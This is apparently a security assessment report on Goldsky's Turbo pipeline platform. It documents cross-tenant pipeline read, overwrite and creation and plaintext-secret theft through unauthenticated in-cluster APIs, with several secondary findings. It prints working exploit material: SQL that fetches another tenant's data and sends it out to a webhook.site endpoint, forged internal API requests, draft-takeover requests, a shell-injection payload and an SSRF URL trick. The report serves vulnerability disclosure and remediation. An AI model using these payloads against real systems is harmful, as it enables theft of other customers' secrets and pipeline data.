# Goldsky Turbo: cross-tenant pipeline read/write through the unauthenticated in-cluster APIs

Date: 2026-11-15
Scope: `live-goldsky-monorepo-site-cms-compos-b94b982e` (run `…2611150420-16699820003`); the work
was first proven under the earlier org-wide scopes, which are deleted.
Accounts: free test A (victim) `cmwh95cyzd0f901rzd3dp1657` / `project_cmvlqkfmh6zml01veajswaam8`;
B (attacker) `cmwh96gp7d2vq01rze08l5919` / `project_cmwh969vg31re01q07b1rgk9z`.

## Verdict on the briefed hypothesis

"Turbo lets one account reach another account's deployment by guessing the handle, while other
surfaces sanitise it" is **false for the key-scoped HTTP API**. Every `/api/admin/...` and
`/api/v1/...` pipeline route derives the project from the bearer key and scopes the lookup.
`x-goldsky-project-id` is honoured only on cookie sessions (`auth.ts:377` reads it inside
`loadActiveProjectForUser`, called only when a `goldsky_session` cookie exists); a bearer
request ignores it.

It is **true one layer down**: the streamling agent and the api-server's `/internal/compose`
routes accept `<projectId>` / `<appId>` straight from the caller and have no authentication
of their own. Tenant code inside the cluster — a Turbo pipeline is enough, no compose plan
needed — can therefore read, overwrite and create pipelines in any project whose id and
pipeline name it knows. Both are printed in the public dashboard URL
`https://app.goldsky.com/<projectId>/dashboard/pipelines/turbo/<name>`.

## Control: key surfaces are scoped

A deploys `audit-handle-1`; B with B's own key:

```
GET  /api/admin/streamling/v1/audit-handle-1            -> 404 "Pipeline 'audit-handle-1' not found"
GET  /api/admin/pipelines/v1/turbo/audit-handle-1       -> 404 "Pipeline with name: audit-handle-1 not found"
GET  /api/v1/pipelines/audit-handle-1                   -> 404 pipeline-not-found
PUT  …/streamling/v1/audit-handle-1/pause               -> 404
PUT  …/streamling/v1/audit-handle-1/restart             -> 404
DELETE …/streamling/v1/audit-handle-1                   -> 404 "no workload exists"
GET  …/streamling/v1  (with -H 'x-goldsky-project-id: <A project>') -> {"pipelines":[]}
```

Correct paths: `streamlingApiPlugin.ts:417-431` builds every upstream URL as
`/pipeline/${request.project.id}${path}`; `streamlingClient.ts:461` does the same.

## The hole

`streamling-agent` mounts every route with only a logging middleware — no auth layer
(`streamling-agent/src/main.rs:497-640`; the `.layer()` at :640 is
`middleware::from_fn(endpoint_logging_middleware)`). The only project gate is an ops
allowlist, not ownership (`api.rs:1594-1600` → `config.is_project_allowed`, `config.rs:799-803`,
which is `*` in production). The api-server's `/internal` plugin rejects nothing either
(`internal-api-plugin.ts:18-27`, "Log-only: never rejects", with an early return for
`/internal/compose`), and `parseAppId` only regex-splits the handle
(`compose-api/appId.ts:12-25`) before `internalComposePipelinesPlugin.ts:77,182,211,240,269,287`
hand the derived project straight to `StreamlingClient`.

Both names are reachable from a tenant-controlled pipeline pod: the dataset preprocessor
already calls `http://goldsky-api-service.default/internal/dataset/lookup`, and compose's own
host code calls the same service. `ctx.fetch` blocks private addresses (`compose/lib/public-fetch.ts`),
but a pipeline's SQL `_gs_fetch_abi` and its webhook sink use plain HTTP clients and do not.

### 1. Read (B reads A's deployment)

B deploys a pipeline whose SQL fetches A's pipeline from the agent and a webhook sink
re-publishes the row to a public echo:

```sql
SELECT id,
       _gs_fetch_abi('http://streamling-agent.streamling-cloud.svc.cluster.local:8124/pipeline/project_cmvlqkfmh6zml01veajswaam8/audit-handle-1','raw') AS stolen
FROM transfers
```

Captured at the webhook endpoint:

```json
{"id":"log_0x852548d1…","stolen":"{\"name\":\"audit-handle-1\",\"status\":\"ACTIVE\",…,\"definition\":{\"name\":\"audit-handle-1\",…,\"filter\":\"block_number BETWEEN 1000000 AND 1000100\"}}"}
```

A's full definition, image tag, and timestamps are now on B's endpoint.

### 2. Modify (B overwrites A's deployment)

B's pipeline builds the desired definition with `named_struct` and webhook-POSTs it to the
agent's apply route, which is `POST /pipeline/:project/:name` and takes `{definition}`:

`{"id":"…","definition":{"name":"audit-handle-1","description":"owned-by-B",…}}`

A's view afterwards (A's own key):

```json
{"updated_at":"2026-11-15T03:42:00Z","definition":{"name":"audit-handle-1","description":"owned-by-B",…}}
```

The description and topology are B's. The agent re-deploys the pod under A's namespace.

### 3. Create in A's project (and bypass A's plan limit)

B's pipeline POSTs a forged appId to the unauthenticated internal compose route:

```
POST http://goldsky-api-service.default/internal/compose/pipelines
{"appId":"project_cmvlqkfmh6zml01veajswaam8-x","name":"injected-by-b","resource_size":"xs","definition":{…}}
```

A's project list now contains a pipeline B created:

```json
{"name":"x--u--injected-by-b","status":"ACTIVE","project_id":"project_cmvlqkfmh6zml01veajswaam8","created_at":"2026-11-15T03:57:30Z"}
```

It is A's second pipeline on a free tier whose key-scoped create route refuses the second
pipeline (`403 "reached the Turbo pipelines limit"`) because the internal plugin runs no
billing/limit hooks.

## The three layers the brief named

- **Webapp route.** `packages/webapp/src/routes/[[projectId]]/dashboard/pipelines/turbo/[name]/+layout.ts`
  guards only feed-sync visibility; `edit/+page.server.ts:32-34` fetches
  `/api/admin/pipelines/v1/turbo/${decodeURIComponent(params.name)}` with the user's cookies.
  `hooks.server.ts:59-77` rewrites the active-project cookie to `event.params.projectId`, and
  `auth.ts:377` honours it — but only on a cookie session, and a non-member project falls back to
  the caller's first project instead of 404 (`auth.ts:479-490`). So the webapp agrees with the key
  surfaces: it can only ever render what the caller's project owns.
- **api-server handler.** `pipelinesApiPlugin.ts:206-296` and the streamling proxy both pass
  `request.project.id`. Correct.
- **CLI handle derivation.** The `turbo` binary reads `~/.goldsky/auth_token`, calls
  `/auth/check_token` to learn its project ("Using project: …" in its own strings), then addresses
  `/api/admin/streamling/v1/<definition.name>`. The handle is exactly the YAML `name` — no
  generated suffix, no entropy, and the pack's own guidance calls it guessable. The project still
  comes from the token, so the handle alone never selects a deployment on this path.

## Delete, and the key-scoped draft hole (proven live)

The agent's own `DELETE /pipeline/:p/:n` is reachable only from a pod, and a pipeline can issue
GET and POST but not DELETE, so the in-cluster delete is source-proven: it sits on the same path
behind the same `check_project_access` gate as the GET/POST above
(`main.rs:540-553`, `api.rs:1605-1615`), and the internal compose DELETE carries the same appId
trust.

The draft routes give a fully live, key-only delete — plus a takeover that the pipeline routes
do not have. `PUT` and `DELETE /api/admin/pipelines/v1/turbo/drafts/:id` resolve the row by id
alone, and the update writes the caller's `project_id`:

- `draftClient.ts:151-170` — `turboDraft.update({ data: { …, project_id: project.id }, where: { id } })`
- `draftClient.ts:186-198` — `turboDraft.delete({ where: { id } })`

With A's key: `POST /api/admin/pipelines/v1/turbo/drafts/draft-a` → `cmwhbu34h000a296kpexafx1t`.
Then with B's key:

```
GET    /api/admin/pipelines/v1/turbo/drafts/cmwhbu34h000a296kpexafx1t          -> 404
PUT    …/turbo/drafts/cmwhbu34h000a296kpexafx1t  {…,"description":"overwritten-by-B"} -> 200
DELETE …/turbo/drafts/cmwhbu34h000a296kpexafx1t                                -> 204
```

After the PUT, A's `GET …/drafts/<id>` is 404 and A's list is empty while B's list holds the
draft with B's description — the draft moved project. The DELETE then removes it for good. Draft
ids appear in the dashboard URL `/dashboard/pipelines/turbo/drafts/<id>`.

## Impact

- Read any tenant's pipeline definition by name (sources, sinks, secrets names, topology).
- Overwrite it (the agent re-deploys; A's pod runs B's topology) — availability and
  correctness, and a way to make A's pipeline ship data somewhere else.
- Create pipelines in the victim project, bypassing pipeline-count and plan gates.
- Preconditions only: project id + pipeline name, both public in the dashboard URL. Any
  compose task, or any Turbo pipeline, can be the caller.


## Wider `/internal` exposure (code-established)

`/internal` never rejects (see above), so every route in it is a tenant-reachable, project-trusting
surface. The severe ones:

- **Plaintext secrets.** (proven live) `GET /internal/secrets/:projectId/:secretName` looks the record up by
  `(name, project_id)` and returns `value` straight from Doppler
  (`secrets-api/internal.ts:11-49`). Any pod can dump another project's DB credentials, webhook
  secrets or private keys by name. `POST /internal/secrets` with `{projectId, name, value}`
  (`internal.ts:58-92`) writes one.
- **Mass pause.** `POST /internal/free-trial/pause-subgraphs` and `/pause-streams` take
  `project_id` from the body and pause everything the project runs
  (`free-trial/index.ts:17-25`, `:72-84`).
- **Subgraph deletion by id.** `POST /internal/auto-pause-delete/delete-subgraph` resolves
  `findUnique({where:{id: subgraph_id}})` with no project predicate, then deletes the row, its
  tags, webhooks, graph-node deployment and monitor (`auto-pause-delete/index.ts:18-30`).
- **CDC rows.** `GET /internal/cdc/` lists every project's CDC row unauthenticated;
  `POST …/register-subgraph-entities` upserts under any `projectId`
  (`cdc-api/cdcApiPlugin.ts:55-70`). The plugin's own docstring assumes the agent checked the
  project first — true of the agent, false of a direct caller.

The rest are read from source; only the secrets route was exercised live (below).

Reachability measured: `api.goldsky.com/internal/…` and `internal.goldsky.com/internal/…` both
answer nginx 404, and `/api/internal/…` reaches Fastify but has no mount, so `/internal` is not
publicly routed today — an in-cluster caller is required.

### Live proof for the secrets route

A created `AUDIT_SECRET` (`httpauth`, value `Bearer SECRET-MARKER-123`) with A's key. A pipeline
in the cluster ran:

```sql
SELECT id, _gs_fetch_abi('http://goldsky-api-service.default/internal/secrets/project_cmvlqkfmh6zml01veajswaam8/AUDIT_SECRET','raw') AS stolen FROM transfers
```

and webhooked the row out. Captured verbatim:

```json
{"stolen":"{\"data\":{\"id\":\"clientsecret_cmwhbg4yblju501s0b2hyg954\",\"name\":\"AUDIT_SECRET\",\"description\":\"b-proof\",\"type\":\"httpauth\",\"value\":{\"type\":\"httpauth\",\"secretKey\":\"Authorization\",\"secretValue\":\"Bearer SECRET-MARKER-123\"}}}"}
```

The route never looks at the caller, so the pipeline's own project is irrelevant; a pod in any
project reads any project's plaintext secret by name.


## Secondary: compose build-path SSRF (code-established)

The chatbot "deploy from source" bundler writes every supplied file into a tmp sandbox
(`compose-api/bundle-from-source.ts:404-408`) and then runs `pnpm install --ignore-scripts` in it
(`npm-install.ts:65-84`). The only path checks are "not absolute, no `..`" (`:143-148`), so a caller
can also supply `.npmrc`, and pnpm reads the registry from it. `registry=http://<internal-host>/…`
therefore makes the api-server fetch a caller-chosen URL from inside the cluster; pnpm's fetch
failure text is echoed back through `sanitizeBundleError` (`:423`) and the deploy card.

Not exercised live: the path ends in a composeDeploy workflow, which the free accounts cannot run
(Scale gate). The install is only reached when `package.json` declares an allowlisted dependency
(`:396-414`).

## Website preview generator: unauthenticated draft access, unbounded writes (proven live)

`pages/api/preview/generate.ts` on the marketing site (served at `hem.so`) is a public POST. It
checks only that fields are present and emails look like emails (`:33-60`); there is no auth, no
rate limit, and `ownerInfo` is taken at face value (`:186-193`), so a caller claims to be the owner
of a session it created. Each call writes two `review` documents per recipient into the production
Sanity dataset with the server token (`:118-176`, `:210-230`). `expirationDays` is unbounded
(`:114`).

The preview page then trusts the minted token: `pages/preview/[slug].tsx:99-117` looks the session
up by token, checks only `revoked`/`expiresAt`/slug equality, and fetches the document with
`getPostBySlug(slug, true)` — the server token plus `previewDrafts` (`lib/sanity.ts:128-145`).
`documentId` is stored only as a weak reference and never used to render, so a fabricated id is
enough; the slug is the real key.

```http
POST https://hem.so/api/preview/generate
{"documentId":"fake-123","documentType":"post","slug":"building-a-blockchain","mode":"shared",
 "recipients":[{"name":"x","email":"x@example.com"}],"ownerInfo":{"name":"probe","email":"probe@example.com"}}
→ 200 {"success":true,"sessions":[{"previewUrl":"https://hem.so/preview/building-a-blockchain?token=…"}]}
```

Following that URL renders the post through the draft perspective (stega markers present in the
title). `expirationDays: 36500` returned `expiresAt` in 2126; `-3` returned a link already expired.

Impact: anyone who knows a draft's slug reads unpublished content, can mint an unlimited number of
long-lived sessions against the production dataset, and is treated as the session owner. Slugs are
low entropy and drafts are usually named close to the eventual slug, so guessing is realistic.

## Fix shape

Authenticate `/internal/*` and the agent (e.g. mTLS or a service token), or at minimum make
the internal compose routes verify the appId against the DB and have the agent check
ownership with the api-server instead of an allowlist.


## Secondary: support-bot shell injection

`packages/support-bot/src/debug-subgraph/debugSubgraph.ts` takes `subgraphDeploymentId` from the
operator prompt (:206-208) and interpolates it unquoted into `kubectl exec … graphman info -s ${id}`
(:27, also :61, :97, :124, :239). `utils.ts:170-183` runs it through `child_process.exec`, i.e.
`/bin/sh -c`. It is also interpolated into ClickHouse SQL, `WHERE subgraph_id = '${id}'` (:47-52).

Demonstrated with a stub `kubectl`:

```
CMD: kubectl exec --namespace default deploy/indexer-indexer-0-graph-node -- graphman info -s QmX; echo INJECTED; id -un
OUT: kubectl args: … -s QmX
     INJECTED
     hemanth
```

The bot runs on a support engineer's laptop with kubeconfig and Doppler/ClickHouse credentials in
the environment, so a hostile id pasted from a ticket is code execution there. `subgraphInfo.chain`,
read back out of `graphman`, is interpolated the same way.

## Secondary: /internal is log-only beyond compose

`internal-api-plugin.ts:18-27` never rejects; the token is hashed and logged only, and
`/internal/compose` returns before even that. Other routes in the same plugin take the project from
the body with no relationship check: `free-trial/index.ts:20-31` (`pause-subgraphs`),
`internalComposeWalletTablePlugin.ts:31-45` (appId → solution lookup). Any in-cluster tenant caller
can pause another project's subgraphs or read its wallet-table cursor.

## Secondary: two SSRF primitives without a private-range guard

- `edge-api/boost-providers/probe.ts:112-120` and `http.ts` fetch a customer-supplied provider URL
  with plain `fetch`; nothing checks for loopback/RFC1918/link-local. The probe's classification
  (`ENOTFOUND` vs `ECONNREFUSED` vs status, unresolved vs unreachable) makes it a service oracle.
- The chatbot's contract lookup builds `https://${network}.blockscout.com/api/v2` from the raw
  `network` argument (`core/src/utils/contracts/explorer.ts:130-131` default branch, `network.ts`
  passes through). `network = "api.goldsky.com/api/errors/x#"` yields
  `https://api.goldsky.com/api/errors/x#.blockscout.com/api/v2`, and a fragment is not sent, so the
  tool fetches an arbitrary HTTPS host and path. Verified with `new URL` for a bare host, an IP
  literal, and the path case.

## Artifacts

- Traffic echo token: `https://webhook.site/1bd5895c-8e0d-47ec-a444-bcd2aba09b6c`
- Relay used for verb tests (local, cloudflared): `https://drug-clearing-ross-alex.trycloudflare.com`
- Victim pipeline `audit-handle-1` (modified) and injected `x--u--injected-by-b` left running in the test project.
